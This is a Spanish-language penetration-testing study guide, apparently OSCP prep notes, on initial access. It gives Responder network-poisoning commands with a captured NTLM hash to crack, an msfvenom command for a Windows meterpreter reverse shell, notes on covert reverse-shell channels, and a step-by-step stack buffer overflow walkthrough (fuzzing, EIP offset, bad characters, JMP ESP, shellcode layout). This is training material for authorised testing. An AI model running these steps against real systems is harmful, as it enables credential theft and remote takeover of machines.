# INITIAL ACCESS:
Despues de tener un panorama por el reconocimiento y por el contexto de un escaneo de vulnerabilidades, en base a la experiencia podemos comenzar a identificar vias de acceso iniciales.

## CAPTURA DE CONTRASEÑAS:
Una de las primeras etapas es ponernos a escuchar para ver sí podemos capturar paquetes de autenticación donde podamos buscar contraseñas o información que nos ayude en los accesos iniciales.

### RESPONDER:
Herramienta que permite capturar request que nos lleguen a nuestra IP; ya sea por request directo o porque envenenamos la red.

Responder permite envenenar servicios de:
- LLMNR (Link-Local Multicast Name Resolution):
  - Protocolo de resulución de nombres multicast, permite resolver nombres cuando no hay presencia de un DNS, a traves de ipv4 e ipv6 envia paquetes de multicast para encontrar al dispositivo.
  - Su debilidad es que como el paquete viaja por todo multicast nosotros podriamos capturarlo y decir que a quien busca somos nosotros.
- NBT-NS (NetBIOS Name Service):
  - Protocolo de resolución de nombres por brodcast, donde se envia la busqueda de nombres tipo netbios por la red, con el objetivo de cuando se envie un paquete nosotros responder que somos nosotros, que nos envie la información.
- MDNS (Multicast DNS):
  - Protocolo multicast de DNS, usado cuando no existe un servidor de DNS centralizado, mismo problema que los anteriores, podemos enviar paquetes diciendo que somos a quien busca que nos envie la información.
- Versiones nuevas tambien permiten envenenar DNS y DHCP.

La practica más sencilla es abrir responder con la configuración por defecto:
```
> responder -I eth0
```
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-1.png)

En un explorar de archivos escribe lo siguiente, es decir busca un recurso compartido que no exista:
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-smb1.png)

Podemos hacer lo mismo en un explorar web con un dominio que no exista:
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-web.png)

Mismo con un recurso por RDP con un dominio que no exista:
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-rdp.png)

Despues sí ingresamos credenciales o por defecto se envian por el equipo ya sea porque es un servicio o una tarea programada las veremos reflejadas y almacenadas en formato de hashes.

![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-web2.png)

![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/responder-smb.png)

Despues podemos leer el historial de responder y parsear los datos por dia y solo los hashes para poder tratar de desencriptarlos.

```
> cat /usr/share/responder/logs/Responder-Session.log | grep 07/11/2024 | grep NTLM | grep hash | cut -d ":" -f 4-10
```

Lo cual regresara información en este formato:
```
hola2::.:60195920d2a4b827:AC3C88755EC9F5197B96E6243F853CB6:01010000000000003269E66C4CD3DA0100FF684640F8FCD70000000002000800410039003200460001001E00570049004E002D0043005600540049004600300054005300310057004D0004003400570049004E002D0043005600540049004600300054005300310057004D002E0041003900320046002E004C004F00430041004C000300140041003900320046002E004C004F00430041004C000500140041003900320046002E004C004F00430041004C0008003000300000000000000001000000002000007BD31EEEB9164BF1A193AA3D449F0F715B8B287C37A13D5B0DDD1213F667B6990A00100000000000000000000000000000000000090016005400450052004D005300520056002F006100730064000000000000000000
```

La cual podemos pasarle a john para que trate de reversear el hash, y sí la contraseña es debil facilmente la encontrara, sino pasara a modo incremental.
![RESPONDER](https://raw.githubusercontent.com/DESMOULINS/Per_Aspera_Ad_OSCP/main/Imagenes/john1.png)

Hay más opciones de crackeo como hashcat y grafico l0phtCrack pero este ultimo no es tan comun.

## Busqueda manual de vulnerabilidades:
Ya que tengamos un reconocimiento tendremos muchas versiones, el tema es que tipicamente aunque la versión sea vulnerable el escaner de vulns no siempre te reporta el hallazgo, por lo que siempre hay que buscar manualmente las versiones para ver que CVE tiene ya asociados.

### EXPLOITDB:
Para esto nos podemos ayudar en la base de datos de ExploitDB, la cual acumula los cve y exploits del respectivo CVE.

- https://www.exploit-db.com/

O traves de kali con searchsploit:
```
> searchsploit Redis
```

## Creación de payloads:
Un tema tambien vital dentro del hacking es la creación de un malware especial llamado reverseshell, hoy en día con el incremento del uso de herramientas tipo EDR y EPP más sofisticadas muchas herramientas de creación de malware han quedado obsoletas, pero... eso no quita que nos sirvan como base para crear el programa que despues nosotros podamos ofuscar (es el arte de encriptar, ocultar, comprimir codigo para evadir controles).

### MSFCONSOLE:
Es la herramienta más sencilla y conocida para la creación de payloads, permite crear archivos elf, exe, incluso apk. Una guia con los más comunes la podemos encontrar en:

- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

La estructura más basica es:
```
msfvenom -p (tipo de payload) LHOST=(IP Address - Listener) LPORT=(Your Port - Listener) -f (extensión) > nombrefichero.extension
```

Por ejemplo, una reverse shell de meterpreter para windows (spoiler: osfuscar una sesión de meterpreter es muy dificil lo comun es shell genericas, a menos claro audites un sistema sin protección de antimalware, sistema antiguo de windows o sistemas linux):
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```

### Reverse Shells con evasión:
Tipicamente nos toparemos con que no existe salida de TCP o UDP, por lo que tendremos que buscar salir por conexiones como DNS, ICMP, etc. o camuflajearnos dentro de conexiones HTPPS, este tipo de reverseshell son un poco más sofisticadas, pero muy utiles.

#### HTTP:
Ya sea por ssl o por texto plano, podemos crear una reverse shell que envie el resultado del comando por parametros de GET, o incluso ocultos en la cookie.

#### ICMP:
Oculto en las cabeceras del paquete puede venir la información de ejecución de comandos.

#### DNS Tunneling:

#### TCP Parameters:
Dentro de las cabeceras de los paquetes de TCP puede venir información oculta.

- IP Identification Field: Aqui cabe un caracter por conexión.
- TCP Acknowladgement Number: Aqui cabe un caracter por conexión pero es más dificil manejarlo.
- TCP Initial Number: No es necesario empezar la conexión, permite encapsular un caracter en flags SYN y RST. 

### Payloads en codigo interpretado:
Tambien podemos crear en base a codigo no compliado por ejemplo powershell, php, bash, etc. Esto claro dependera del servicio a explotar, una buena guia con tipicos payloads es:

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Explotar servicios:
Despues de haber dectado versiones de los servicios, correlacionado la versión con el CVE y su exploit, hashes, o incluso haber desecriptado usuarios podemos pasar a ya directamente interacturar con servicios.

### Buffer overflow:
Ocurre cuando un programa escribe más datos en un buffer de los que este puede manejar, permitiendo a un atacante sobrescribir la memoria adyacente y potencialmente ejecutar código malicioso. Este tipo de vulnerabilidad puede llevar a la corrupción de datos, caídas del programa y compromisos de seguridad.

Por ejemplo, tienen una caja de comentarios donde envias datos y lo recibe la variable "comentarios" pero esa variable solo fue creada para soportar 100 letras ¿Que pasa sí llegan 101? En algunos casos sobreescribiras variables que esten a los lados, esto permitiria alterar el estado y flujo porque la variable del lado ya no esta con el valor esperado.

#### Test desbordamientos:
En este caso vamos a explicar y hacer un ejemplo del caso más basico y comun que es el buffer over flow de pila.

A traves de fuzzear con parametros que incrementan el tamaño podemos monitorear el crasheo de la función o de la función, en caso de que veamos que la aplicación en cierto metodo no pueda manejarla y se caiga, podemos encontrar el primer hayallazgo de que algo esta pasando.

Con las herramientas SPIKE nos permite hacer pruebas a puertos, por ejemplo, con la herramienta generic_send_tcp y un archivo spike podemos enviar datos para buscar que la aplicación crashee.

Supongamos que encontramos el puerto 9999, el cual cuando le hacemos un nc al puerto nos responde con un menu y varios comandos permitods, por ejemplo:
```
> nc x.x.x.x 9999
< Hello! I´m a vulnerable server!
> HELP
< COMMAND <STRING>
< COMMAND2 <NUMBER>
```
Lo que podemos hacer es intentar fuzzer cada uno de los parametros de los comandos buscando ver sí vemos comportamiento anomalo.
```
> nano test.spk
>> s_readline();
>> s_string("COMMAND ");
>> s_string_variable("");
```
El archivo lo que va a hacer es dar instrucciones para primero leer lo que nos envia el puerto, despues escribira la palabra indicada que debemos analizar previamente de la aplicación, por ejemplo aqui pondra command, despues escribira una serie predefinida de strings creados para busqueda de crash, por ejemplo ../../etc/passwd,AAA..AA,entre otros.

Para ejecutar lo anterior lo podemos hacer a traves del comando generic_send_tcp, especificando la ip y puerto del servicio.
```
> generic_send_tcp 10.10.1.11 9999 test.spk 0 0
< Hello! I´m a vulnerable server!
> COMMAND ../../etc/passwd
< Hello! I´m a vulnerable server!
> COMMAND AAA..AA
< Hello! I´m a vulnerable server!
> COMMAND AAAAAAAAAAA....AAAA
< The port doesn't respond!
```
Despues dependera sí tenemos acceso al aplicativo podemos abrir inmmunify Debugger (Software de depuración cuando tenemos acceso al aplicativo) y monitorear la entrada de datos, o sino tenemos acceso al servidor se puede hacer con wireshark buscando el string que logro hacer se corrompa la aplicación.

Despues de saber la longuitud o tipo de paraemtro, podemos enviar una cadena especifica donde se corrompa la memoria creando un buffer que estara al limite de romper la aplicación:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900
-l <buffer en tamaño de bytes de la cadena encontrada que rompio la aplicación o causo errores>
```
Uno de los objetivo es lograr ver el tamaño del buffer antes de que toque el EIP, el EIP recordemos es la siguiente instrucción que el programa va a correr despues de terminar la actual tarea, entonces es vital apuntarlo a una función que nosotros deseemos, por ejemplo un opcode JMP ESP que nos redireccione al inicio de la pila a leer codigo malicioso.

Para ello podemos generar un patron especifico que sea facil de trackear, con:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
```
A traves de este patron enviamos datos a la función vulnerable y dentro de la herramienta de inmmunify buscamos con que datos se sobreescribio el EIP.
" agregar imagen
Teniendo el dato podemos buscar la posición del patron con:
```
> /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337
[*] Exact Match at offset 2003
```
Esto quiere decir que exactamente en el byte 2003 debemos inyectar a la función que queremos llamar por medio del EIP, esto podemos validarlo enviando 2003 bytes de cadenas random y despues agregando por ejemplo 4 D, y debemos ver como en el EIP se escriben los 4 D enviados.
** agregar imagen

Despues debemos validar que caracteres no estan permitidos ("bad chars" - es decir crashean a la aplicación), por ejemplo uno comun es el "\x00" (caracter nulo), el listado de más de los comunes es:
badchars = (
"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f"  
"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"  
"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f"  
"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f"  
"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f"  
"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf"  
"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf"  
"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff
")  

Desde la extensión de "mona.py" que podemos cargar en immunity (C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands) podemos generar esta lista con el comando:
```
> !mona bytearray
```
Enviamos la cadena y vamos limpiando viendo cuales del lado del buffer son limpiados por la aplicación.

Despues desde esta misma extensión podemos buscar librerias que sean vulnerables y no tengan protección.
```
> !mona modules
```

Por ejemplo sí encontramos que la libreria essfunc.dll que usa el software que estamos testeando no esta protegida y ademas es predecible, podemos dirigir el trafico hacia un op code JMP ESP.

El "Op Code" (operation code) llamado JMP ESP es interesante dado que:
- JMP: Es una instrucción de ensamblador que significa "jump" (saltar).
- ESP: Es el registro que apunta al tope de la pila (stack pointer).

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

En otras palabras hara que el sentido del programa se dirigida a leer el espacio del ESP, que justamente lo acabamos de sobre escribir con el anterior over flow, podemos definir que el shell code esta compuesto por:

RANDOMBYTES = "A" * 2004 (donde causaremos el la variable llegue a su limite)
NUEVAVARRETORNO = "\xff\xe4\x50\x62"
MALCOD = "Codigo generado con msfvenom de codigo compilado en C"

Esto va a provocar que:
RANDOMBYTES sobre escribe el EAX
NUEVAVARRETORNO sobre escribe el EIP
MALCOD sobre escribe el ESP

Entonces al ejecutarse y terminar de leer los datos introducidos y sobre escribirse, leera el EIP que ahora es una función de JMP ESP, entonces se ira a leer el ESP que justamente ahora tiene una reverseshell.











.
